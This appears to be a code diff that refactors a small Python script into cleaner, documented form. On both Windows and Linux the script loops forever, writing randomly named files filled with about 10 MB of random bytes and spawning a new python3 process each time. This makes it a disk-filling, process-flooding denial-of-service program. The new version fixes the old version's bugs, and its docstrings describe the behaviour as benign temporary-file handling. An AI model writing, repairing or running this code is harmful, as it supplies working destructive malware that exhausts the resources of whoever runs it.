@@ -1,42 +1,37 @@
-import sys, os, random, string, subprocess
+import os
+import random
+import string
+import subprocess
+import sys
 
-SCRIPT = sys.argv
-NAME = str(SCRIPT[0])
+def generate_random_string(length):
+    """Returns a random string of lowercase letters with the given length."""
+    return ''.join(random.choices(string.ascii_lowercase, k=length))
 
-def RANDOM(Length):
-	Letters_ = string.ascii_lowercase
-	return ''.join(random.choice(Letters_) for i in range(Length))
+def create_temp_file():
+    """Creates a temporary Python file with the contents of the current script."""
+    temp_file_name = generate_random_string(64) + '.py'
+    with open(temp_file_name, 'w') as temp_file:
+        temp_file.write(open(__file__).read())
+    return temp_file_name
 
-def WIN32():
-	TEMP_FILE = open(__file__).read()
-	TEMP_A = RANDOM(64)
-	TEMP_B = RANDOM(4)
+def write_random_bytes_to_file(file_name, num_bytes):
+    """Writes a specified number of random bytes to a file."""
+    with open(file_name, 'wb') as temp_file:
+        temp_file.write(os.urandom(num_bytes))
 
-	with open(TEMP_A + '.' + TEMP_B, 'w') as TEMP_C:
-		TEMP_C.write(TEMP_FILE)
-	with open(TEMP_A + '.' + TEMP_B, 'wb') as TEMP_D:
-		TEMP_D.write(os.urandom(10240000))
+def run_script(script_name):
+    """Runs the specified Python script in a new process."""
+    subprocess.Popen(['python3', script_name], shell=False)
 
-	TEMP_E = '{}.{}'.format(TEMP_A, TEMP_B)
-	subprocess.Popen(["python3", TEMP_E], shell = False)
+if sys.platform.startswith('win'):
+    while True:
+        temp_script_name = create_temp_file()
+        write_random_bytes_to_file(temp_script_name, 10_240_000)
+        run_script(temp_script_name)
 
-def LINUX():
-	TEMP_FILE = open(__file__).read()
-	TEMP_A = RANDOM(64)
-	TEMP_B = RANDOM(4)
-
-	with open(TEMP_A + '.' + TEMP_B,'w') as TEMP_C:
-		TEMP_C.write(File_)
-	with open(ExampleName,'wb') as TEMP_D:
-		TEMP_D.write(os.urandom(10240000))
-
-	TEMP_E = '{}.{}'.format(TEMP_A, TEMP_B)
-	subprocess.Popen(["python3", TEMP_E], shell = False)
-
-if sys.platform == "win32":
-	while True:
-		WIN32()
-
-elif sys.platform == "linux2":
-	while True:
-		LINUX()
+elif sys.platform.startswith('linux'):
+    while True:
+        temp_script_name = create_temp_file()
+        write_random_bytes_to_file(temp_script_name, 10_240_000)
+        run_script(temp_script_name)
